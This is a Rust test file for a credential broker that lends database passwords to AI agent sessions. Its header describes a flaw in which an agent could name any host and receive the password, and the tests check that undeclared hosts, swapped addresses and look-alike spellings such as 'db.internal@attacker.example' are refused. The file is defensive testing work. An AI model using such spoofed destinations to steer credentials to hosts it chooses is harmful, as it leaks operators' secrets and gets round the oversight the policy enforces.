//! H5 — the agent chose where the database password went.
//!
//! `PostgresConnect` carries `host` and `host_addr` in the request. The
//! credential is looked up by `(database, role)`, the connector's own
//! authorisation checks `policy.allows(&database, &role)`, and the policy
//! resource is `Resource::Database { name, role }` — which has no destination
//! in it at all. With `LiveConnectorFactory::server_name` left at its default
//! of `None`, the TLS server name also came from the request.
//!
//! So an operator who granted a session `postgres_read` on `app`/`readonly` had
//! granted it on *whatever host the agent then named*. The pair matched, the
//! policy was satisfied, and the broker handed the password to a destination
//! the operator never wrote down. UAT-006 names this threat — "Agent attempts to
//! use GitHub-bound capability on `evil.example`" — but the GitHub path cannot
//! be misaimed, because `ReadIssue` has no host field and the audience is the
//! compile-time `GITHUB_AUTHORITY`. The threat was real and the test was pointed
//! at the one path where it is impossible.
//!
//! # The observable is a counter, not an error code
//!
//! Every case here asserts on how many times the vault was asked to lend
//! anything. `Denied` alone would not distinguish "refused before touching the
//! secret" from "refused after", and those are different properties: the first
//! is the guarantee, the second is a coincidence. A `SecretPort` that counts
//! `lend` calls makes the guarantee directly observable.
//!
//! The control exists so a zero is meaningful. The same fixture, the same vault,
//! the same runtime, the same `(database, role)` — only the destination differs —
//! and the permitted case *does* reach the vault. A count of zero on the refused
//! cases is then a fact about the destination, not about a fixture that never
//! got as far as borrowing anything.
//!
//! Both halves of the destination are covered, because they are one hole: an
//! allowlist on `host` alone still lets a request keep the allowed name and swap
//! the address.

use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::Arc;

use asv_broker::{handle, BrokerState, PgRuntime};
use asv_connector_http::{SecretError, SecretPort, SecretSink};
use asv_domain::{AgentSessionId, CredentialKind, CredentialMetadata};
use asv_identity::{PeerCredentials, WorkloadIdentity};
use asv_ipc_protocol::{ErrorCode, Request, Response};

/// The host the deployment declared it would lend to.
const DECLARED_HOST: &str = "db.internal";
/// The address it declared for that host.
///
/// Loopback on purpose. The vault is consulted *before* the socket is opened,
/// so the control still observes exactly one `lend` — and a refused loopback
/// connection returns in microseconds, where an unroutable address would sit
/// through a multi-second TCP timeout on every run of this suite.
const DECLARED_ADDR: &str = "127.0.0.1";
/// An address the deployment never declared.
const FOREIGN_ADDR: &str = "203.0.113.9";

/// A `SecretPort` that counts how many times it was asked to lend.
///
/// The count is the assertion. Nothing is actually returned, so a test that
/// reaches this point has already proven the broker committed to authenticating
/// somewhere.
struct CountingPort {
    lends: Arc<AtomicUsize>,
}

impl SecretPort for CountingPort {
    fn lend(&self, _credential: &str, sink: &mut dyn SecretSink) -> Result<(), SecretError> {
        self.lends.fetch_add(1, Ordering::SeqCst);
        sink.accept(b"not-a-real-password")
    }
}

struct Harness {
    state: BrokerState,
    peer: WorkloadIdentity,
    session: AgentSessionId,
    lends: Arc<AtomicUsize>,
}

fn harness() -> Harness {
    let mut state = BrokerState::default();

    let lends = Arc::new(AtomicUsize::new(0));
    state.secrets = Some(Arc::new(CountingPort {
        lends: Arc::clone(&lends),
    }));

    use std::sync::OnceLock;
    static RUNTIME: OnceLock<tokio::runtime::Runtime> = OnceLock::new();
    let runtime = RUNTIME.get_or_init(|| {
        tokio::runtime::Builder::new_multi_thread()
            .worker_threads(2)
            .enable_all()
            .build()
            .expect("runtime")
    });
    state.runtime = Some(PgRuntime::from_handle(runtime.handle().clone()));

    // A credential for the pair the operator would have granted. Its presence
    // is what makes the refused cases mean something: there *was* a secret to
    // take, and the broker did not take it.
    state.credentials.push(CredentialMetadata::new(
        "pg/app/readonly",
        CredentialKind::DatabaseCredential,
    ));

    let mut peer = WorkloadIdentity::from_peer(PeerCredentials {
        pid: std::process::id() as i32,
        uid: unsafe { libc::getuid() },
        gid: unsafe { libc::getgid() },
    });
    peer.pin_pidfd().expect("the test pins its own process");
    let session = state.sessions.create("/repo".to_string(), &peer);

    Harness {
        state,
        peer,
        session,
        lends,
    }
}

impl Harness {
    fn connect(&mut self, host: &str, host_addr: &str) -> Response {
        handle(
            &mut self.state,
            &self.peer,
            Request::PostgresConnect {
                session: self.session,
                host: host.to_string(),
                host_addr: host_addr.to_string(),
                port: 5432,
                database: "app".to_string(),
                role: "readonly".to_string(),
            },
        )
    }

    /// How many times the vault was asked for anything.
    fn lends(&self) -> usize {
        self.lends.load(Ordering::SeqCst)
    }
}

/// A refusal, asserted on the count rather than on the wording.
///
/// The message is deliberately not asserted: the property under test is that no
/// secret was borrowed, and a test that pinned the English wording would fail on
/// a reword without the guarantee changing.
fn assert_never_borrowed(h: &Harness, response: Response, what: &str) {
    assert_eq!(
        h.lends(),
        0,
        "{what}: the broker asked the vault to lend a credential for a \
         destination the deployment never declared. Response was {response:?}"
    );
    if let Response::Error { code, message } = &response {
        assert!(
            matches!(code, ErrorCode::Denied | ErrorCode::InvalidRequest),
            "{what}: a destination the deployment never declared must be refused, \
             not attempted. Got {code:?}: {message}"
        );
    }
}

// --- The control -----------------------------------------------------------

/// A deployment that declared `DECLARED_HOST`/`DECLARED_ADDR`, and nothing
/// else. This is the whole configuration surface: a list of destinations the
/// broker is willing to lend to.
fn declaring_deployment() -> Box<dyn asv_broker::ConnectorFactory> {
    Box::new(asv_broker::LiveConnectorFactory {
        destinations: vec![asv_broker::PgDestination::new(
            DECLARED_HOST,
            DECLARED_ADDR.parse().expect("a literal address"),
        )
        .expect("a canonical host")],
        ..Default::default()
    })
}

/// The declared destination is reached, and the vault is asked.
///
/// Without this, every other case would pass on a fixture that never borrowed
/// anything at all, and the count would be measuring the fixture rather than the
/// gate. The broker has no reachable transport in this test, so the connect
/// cannot complete — but it must get far enough to *want* the password, which is
/// the point.
#[test]
fn the_declared_destination_is_reached() {
    let mut h = harness();
    h.state.connectors = declaring_deployment();

    let response = h.connect(DECLARED_HOST, DECLARED_ADDR);

    assert_eq!(
        h.lends(),
        1,
        "the declared destination must still reach the vault, or every denial \
         below is vacuous. Response was {response:?}"
    );
}

/// The same request against the same deployment, one field changed.
///
/// The pairing that makes the whole file mean something: identical fixture,
/// vault, runtime and `(database, role)`, identical request except the address.
/// One borrows the password, the other does not, and the only thing that
/// differs is whether the destination was declared.
#[test]
fn a_declared_host_with_a_foreign_address_is_refused_while_the_declared_one_is_not() {
    let mut allowed = harness();
    allowed.state.connectors = declaring_deployment();
    let _ = allowed.connect(DECLARED_HOST, DECLARED_ADDR);
    assert_eq!(allowed.lends(), 1, "the declared pair must borrow");

    let mut refused = harness();
    refused.state.connectors = declaring_deployment();
    let _ = refused.connect(DECLARED_HOST, FOREIGN_ADDR);
    assert_eq!(
        refused.lends(),
        0,
        "the same host with another address must not"
    );
}

// --- The hole --------------------------------------------------------------

/// A host the deployment never declared, with the granted `(database, role)`.
///
/// This is the case UAT-006 describes. The pair matches exactly what an
/// operator would have granted, so nothing in the policy is out of the ordinary
/// — only the destination is the agent's.
#[test]
fn a_host_the_deployment_never_declared_is_refused() {
    let mut h = harness();
    h.state.connectors = Box::new(asv_broker::LiveConnectorFactory::default());

    let response = h.connect("attacker.example", FOREIGN_ADDR);

    assert_never_borrowed(&h, response, "undeclared host");
}

/// The same attack with the *declared* name and a foreign address.
///
/// This is why an allowlist keyed on the host alone is not a fix: the request
/// keeps a name the deployment wrote down and swaps the address the broker
/// dials. The credential is still lent to the attacker.
#[test]
fn a_declared_host_with_a_foreign_address_is_refused() {
    let mut h = harness();
    h.state.connectors = Box::new(asv_broker::LiveConnectorFactory::default());

    let response = h.connect(DECLARED_HOST, FOREIGN_ADDR);

    assert_never_borrowed(&h, response, "declared host, foreign address");
}

/// No destination declared at all: the default has to refuse.
///
/// A deployment that has not configured its destinations is not a deployment
/// that gets to lend to wherever it is asked. This is the fail-closed half, and
/// it is the case a default of "permit the request" would get exactly wrong.
#[test]
fn a_broker_with_no_declared_destinations_refuses_everything() {
    let mut h = harness();
    h.state.connectors = Box::new(asv_broker::LiveConnectorFactory::default());

    let response = h.connect(DECLARED_HOST, DECLARED_ADDR);

    assert_never_borrowed(&h, response, "no destinations configured");
}

// --- Spellings that must not become a way in -------------------------------

/// Spelling tricks against the declared name are refused, not normalised.
///
/// `db.internal.` with a trailing dot and `DB.INTERNAL` in upper case resolve to
/// the same host, and a correct allowlist accepts both. The dangerous spellings
/// are the ones that only *look* like the host — userinfo, percent-encoding, an
/// IP literal in place of a name — and those must not match. A comparison made
/// with a plain string equality would accept some of them and reject the
/// legitimate ones, which is worse in both directions.
#[test]
fn a_host_that_only_looks_like_the_declared_one_is_refused() {
    for (label, host) in [
        ("userinfo", "db.internal@attacker.example"),
        ("percent-encoded", "db%2einternal"),
        ("ip literal", "203.0.113.9"),
        ("subdomain suffix", "evil.db.internal"),
        ("leading dot", ".db.internal"),
    ] {
        let mut h = harness();
        h.state.connectors = Box::new(asv_broker::LiveConnectorFactory::default());
        let response = h.connect(host, DECLARED_ADDR);
        assert_never_borrowed(&h, response, label);
    }
}
